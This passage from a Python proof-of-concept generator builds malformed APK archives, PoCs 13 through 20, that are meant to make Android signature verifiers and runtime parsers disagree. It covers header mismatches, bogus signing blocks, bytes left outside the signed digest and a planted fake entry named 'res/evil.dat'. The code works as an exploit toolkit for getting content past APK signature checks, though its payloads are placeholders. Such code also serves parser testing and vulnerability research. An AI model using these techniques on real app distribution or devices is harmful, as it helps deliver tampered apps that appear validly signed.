    file_data = lfh
    cd_start = len(file_data)

    # CD entry with ZERO extra field length (mismatch!)
    cd = struct.pack('<I', 0x02014b50)
    cd += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<I', crc)
    cd += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    cd += struct.pack('<H', len(fname))
    cd += struct.pack('<H', 0)  # extra len = 0 in CD (mismatch with LFH!)
    cd += struct.pack('<H', 0)
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<I', 0) + struct.pack('<I', 0)
    cd += fname

    file_data += cd

    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0) + struct.pack('<H', 0)
    eocd += struct.pack('<H', 1) + struct.pack('<H', 1)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc13_lfh_extra_mismatch.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-13] LFH extra field mismatch: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 14: Signing Block with Unknown Block IDs
# ===========================================================================
def poc_signing_block_unknown_ids():
    """
    Valid APK Signing Block structure but with unknown block IDs.
    Some tools may warn, others silently ignore unknown IDs.

    This tests whether unknown signing block IDs cause divergent behavior.
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)
    cd_off = find_cd_start(base, eocd_off)

    magic = b'APK Sig Block 42'

    # Multiple unknown block IDs with payloads
    pairs = b''
    for block_id in [0xDEAD0001, 0xDEAD0002, 0xCAFE0001]:
        payload = os.urandom(64)
        pair_size = 4 + len(payload)
        pairs += struct.pack('<Q', pair_size)
        pairs += struct.pack('<I', block_id)
        pairs += payload

    block_size = len(pairs) + 8 + 16
    signing_block = struct.pack('<Q', block_size)
    signing_block += pairs
    signing_block += struct.pack('<Q', block_size)
    signing_block += magic

    pre_cd = base[:cd_off]
    post_cd = base[cd_off:]
    new_cd_off = cd_off + len(signing_block)

    result = bytearray(pre_cd + signing_block + post_cd)
    new_eocd_off = find_eocd(bytes(result))
    struct.pack_into('<I', result, new_eocd_off + 16, new_cd_off)

    path = os.path.join(OUT_DIR, 'poc14_unknown_signing_block_ids.apk')
    with open(path, 'wb') as f:
        f.write(bytes(result))
    print(f"[PoC-14] Unknown signing block IDs: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 15: Version needed to extract mismatch
# ===========================================================================
def poc_version_mismatch():
    """
    Set 'version needed to extract' to a high value (e.g., 63 = ZIP 6.3)
    in the LFH but keep CD at 20 (ZIP 2.0).

    Some tools check LFH version, others only check CD version.
    """
    base = make_minimal_apk_bytes()
    data = bytearray(base)

    # Find LFH for AndroidManifest.xml
    lfh_sig = b'\x50\x4b\x03\x04'
    manifest_name = b'AndroidManifest.xml'
    pos = 0
    while pos < len(data):
        idx = data.find(lfh_sig, pos)
        if idx == -1:
            break
        fname_len = struct.unpack('<H', data[idx+26:idx+28])[0]
        fname = data[idx+30:idx+30+fname_len]
        if fname == manifest_name:
            # Set version needed to 63 in LFH
            struct.pack_into('<H', data, idx+4, 63)
            break
        pos = idx + 1

    path = os.path.join(OUT_DIR, 'poc15_version_mismatch.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-15] Version needed mismatch: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 16: Negative/Wraparound CD entry count
# ===========================================================================
def poc_entry_count_overflow():
    """
    Set the total entry count in EOCD to 0xFFFF (max uint16) while
    only having a few actual entries. Tests integer overflow handling.
    """
    base = make_minimal_apk_bytes()
    data = bytearray(base)
    eocd_off = find_eocd(base)

    # Set entry counts to 0xFFFF
    struct.pack_into('<H', data, eocd_off + 8, 0xFFFF)   # entries on disk
    struct.pack_into('<H', data, eocd_off + 10, 0xFFFF)  # total entries

    path = os.path.join(OUT_DIR, 'poc16_entry_count_overflow.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-16] Entry count overflow: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 17: Gap between LFH data and CD (uncovered bytes)
# ===========================================================================
def poc_uncovered_gap():
    """
    Insert uncovered bytes between the last LFH entry and the CD.
    These bytes are not referenced by any ZIP structure.

    V2/V3 signing computes digest over specific ZIP sections.
    Gap bytes between LFH and CD might not be covered by the digest.
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)
    cd_off = find_cd_start(base, eocd_off)

    # Insert hidden data between LFH section and CD
    hidden = b'HIDDEN_EXECUTABLE_PAYLOAD' * 10

    pre_cd = base[:cd_off]
    post_cd = base[cd_off:]

    new_cd_off = cd_off + len(hidden)
    result = bytearray(pre_cd + hidden + post_cd)
    new_eocd_off = find_eocd(bytes(result))
    struct.pack_into('<I', result, new_eocd_off + 16, new_cd_off)

    path = os.path.join(OUT_DIR, 'poc17_uncovered_gap.apk')
    with open(path, 'wb') as f:
        f.write(bytes(result))
    print(f"[PoC-17] Uncovered gap: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 18: CD entry pointing past end of LFH section
# ===========================================================================
def poc_cd_past_eof():
    """
    A CD entry whose local header offset points beyond the file data section
    into the CD itself. The CD bytes at that offset happen to look like
    a valid LFH (planted).
    """
    manifest = make_minimal_manifest_xml()
    fname = b'AndroidManifest.xml'
    crc = zlib.crc32(manifest) & 0xFFFFFFFF

    # Normal LFH
    lfh = struct.pack('<I', 0x04034b50)
    lfh += struct.pack('<H', 20) + struct.pack('<H', 0)
    lfh += struct.pack('<H', 0) + struct.pack('<H', 0) + struct.pack('<H', 0)
    lfh += struct.pack('<I', crc)
    lfh += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    lfh += struct.pack('<H', len(fname)) + struct.pack('<H', 0)
    lfh += fname + manifest

    file_data = lfh
    cd_start = len(file_data)

    # Normal CD entry
    cd1 = struct.pack('<I', 0x02014b50)
    cd1 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', crc)
    cd1 += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    cd1 += struct.pack('<H', len(fname))
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', 0) + struct.pack('<I', 0)
    cd1 += fname

    # Second CD entry pointing into the CD itself
    evil_fname = b'res/evil.dat'
    evil_data = b'EVIL'
    evil_crc = zlib.crc32(evil_data) & 0xFFFFFFFF

    # Plant a fake LFH inside the CD comment area of entry 1
    # We'll use the area after the normal CD
    fake_lfh_offset = cd_start + len(cd1)

    # Build the fake LFH that will be embedded
    fake_lfh = struct.pack('<I', 0x04034b50)
    fake_lfh += struct.pack('<H', 20) + struct.pack('<H', 0)
    fake_lfh += struct.pack('<H', 0) + struct.pack('<H', 0) + struct.pack('<H', 0)
    fake_lfh += struct.pack('<I', evil_crc)
    fake_lfh += struct.pack('<I', len(evil_data)) + struct.pack('<I', len(evil_data))
    fake_lfh += struct.pack('<H', len(evil_fname)) + struct.pack('<H', 0)
    fake_lfh += evil_fname + evil_data

    # CD entry 2 pointing to the fake LFH (which is inside the CD region)
    cd2 = struct.pack('<I', 0x02014b50)
    cd2 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', evil_crc)
    cd2 += struct.pack('<I', len(evil_data)) + struct.pack('<I', len(evil_data))
    cd2 += struct.pack('<H', len(evil_fname))
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', 0) + struct.pack('<I', fake_lfh_offset)
    cd2 += evil_fname

    cd = cd1 + fake_lfh + cd2
    file_data += cd

    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0) + struct.pack('<H', 0)
    eocd += struct.pack('<H', 2) + struct.pack('<H', 2)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc18_cd_past_eof.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-18] CD entry past LFH section: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 19: CRC mismatch between LFH and CD
# ===========================================================================
def poc_crc_mismatch():
    """
    LFH has one CRC, CD has a different CRC for the same entry.
    Which does the verifier trust? Which does the runtime use?
    """
    base = make_minimal_apk_bytes()
    data = bytearray(base)

    # Find CD entry for AndroidManifest.xml and change its CRC
    cd_sig = b'\x50\x4b\x01\x02'
    target = b'AndroidManifest.xml'
    pos = 0
    while pos < len(data):
        idx = data.find(cd_sig, pos)
        if idx == -1:
            break
        fname_len = struct.unpack('<H', data[idx+28:idx+30])[0]
        fname = data[idx+46:idx+46+fname_len]
        if fname == target:
            # Change CRC in CD to a different value
            old_crc = struct.unpack('<I', data[idx+16:idx+20])[0]
            struct.pack_into('<I', data, idx+16, old_crc ^ 0xDEADBEEF)
            break
        pos = idx + 1

    path = os.path.join(OUT_DIR, 'poc19_crc_mismatch.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-19] CRC mismatch LFH vs CD: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 20: Signing block size mismatch (leading != trailing)
# ===========================================================================
def poc_signing_block_size_mismatch():
    """
    APK Signing Block has mismatched leading and trailing size fields.
    Some parsers read from the top, others from the bottom (magic).
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)
    cd_off = find_cd_start(base, eocd_off)

    magic = b'APK Sig Block 42'

    payload = b'\x00' * 64
    pair_size = 4 + len(payload)
    pair = struct.pack('<Q', pair_size) + struct.pack('<I', 0x7109871a) + payload

    real_block_size = len(pair) + 8 + 16

    # Leading size is correct, trailing size is wrong (larger)
    signing_block = struct.pack('<Q', real_block_size)
    signing_block += pair
    signing_block += struct.pack('<Q', real_block_size + 100)  # MISMATCH
    signing_block += magic

    pre_cd = base[:cd_off]
    post_cd = base[cd_off:]
    new_cd_off = cd_off + len(signing_block)

    result = bytearray(pre_cd + signing_block + post_cd)
    new_eocd_off = find_eocd(bytes(result))
    struct.pack_into('<I', result, new_eocd_off + 16, new_cd_off)

    path = os.path.join(OUT_DIR, 'poc20_signing_block_size_mismatch.apk')
    with open(path, 'wb') as f:
        f.write(bytes(result))
    print(f"[PoC-20] Signing block size mismatch: {path} ({len(result)} bytes)")
    return path


def main():
    print("=" * 72)
    print("APK Parsing Divergence PoC Generator")
    print("=" * 72)
    print()

    pocs = []
    pocs.append(('01_dual_eocd', poc_dual_eocd()))
    pocs.append(('02_overlapping', poc_overlapping_entries()))
    pocs.append(('03_name_mismatch', poc_lfh_cd_name_mismatch()))
    pocs.append(('04_extra_after_eocd', poc_extra_after_eocd()))
    pocs.append(('05_eocd_comment_sigs', poc_eocd_with_comment_hiding_data()))
    pocs.append(('06_unsupported_compression', poc_unsupported_compression()))
    pocs.append(('07_fake_signing_block', poc_fake_signing_block()))
    pocs.append(('08_cd_offset_underflow', poc_cd_offset_underflow()))
    pocs.append(('09_duplicate_cd', poc_duplicate_cd_entries()))
    pocs.append(('10_data_descriptor', poc_data_descriptor()))
    pocs.append(('11_prepended_dex', poc_prepended_data()))
    pocs.append(('12_zero_filename', poc_zero_length_filename()))
    pocs.append(('13_extra_mismatch', poc_lfh_extra_field_hiding()))
    pocs.append(('14_unknown_block_ids', poc_signing_block_unknown_ids()))
    pocs.append(('15_version_mismatch', poc_version_mismatch()))
    pocs.append(('16_entry_count_overflow', poc_entry_count_overflow()))
    pocs.append(('17_uncovered_gap', poc_uncovered_gap()))
    pocs.append(('18_cd_past_eof', poc_cd_past_eof()))
    pocs.append(('19_crc_mismatch', poc_crc_mismatch()))
    pocs.append(('20_signing_block_size_mismatch', poc_signing_block_size_mismatch()))

    print()
    print(f"Generated {len(pocs)} PoC APKs")
    return pocs


if __name__ == '__main__':
    main()
